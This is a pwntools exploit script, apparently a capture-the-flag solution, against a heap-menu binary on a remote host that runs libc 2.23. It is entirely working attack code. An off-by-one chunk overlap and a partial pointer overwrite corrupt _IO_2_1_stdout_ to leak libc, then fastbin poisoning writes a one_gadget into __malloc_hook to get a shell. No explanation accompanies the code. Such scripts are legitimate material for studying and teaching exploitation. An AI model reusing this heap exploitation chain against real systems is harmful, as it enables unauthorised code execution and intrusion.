from pwn import *

io=remote('101.200.53.148',34521)
#io=process('./pwn')
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
libc=ELF('../libc-2.23.so')

def add(idx,size,data):
    io.recvuntil('>>>')
    io.sendline('1')
    io.recvuntil('idx')
    io.sendline(str(idx))
    io.recvuntil('len:')
    io.sendline(str(size))
    io.recvuntil('content:')
    io.send(data)


def free(idx):
    io.recvuntil('>>>')
    io.sendline('2')
    io.recvuntil('idx:')
    io.sendline(str(idx))

add(0,0x28,'a')
add(1,0x30,'a')
add(2,0x60,'c')
add(3,0x60,'d')
add(10,0x28,'a')
add(11,0x30,'a')
add(12,0x60,'b')
add(13,0x60,'c')

free(0)
add(0,0x28,'a'*0x28+p8(0xb1))
free(2)
free(1)
add(2,0x30,'a')
add(4,0x30,'\xdd\x25')
free(2)
add(2,0x38,'a'*0x38+p64(0x71))
io.send('\n')
add(6,0x60,'cccc')
#add(6,0x60,"a")

add(6,0x60,0x33*'A'+p64(0xfbad1800) + p64(0)*3 +'\x00')


IO_stderr = u64(io.recvuntil("\x7f")[-6:].ljust(8,'\x00'))-192
libc_base = IO_stderr - libc.symbols['_IO_2_1_stderr_']
onegadget = 0xf1207 + libc_base
print(hex(libc_base))
malloc_hook = libc_base + libc.symbols['__malloc_hook']
fake = malloc_hook - 0x23
free(10)
add(10,0x28,'a'*0x28+p8(0xb1))
free(12)
free(11)
add(11,0x30,'a')
add(12,0x30,p64(fake))
free(11)
add(11,0x38,'a'*0x38+p64(0x71))
io.send('\n')
add(6,0x60,'aaa')
add(7,0x60,'a'*0x13+p64(onegadget))

io.interactive()
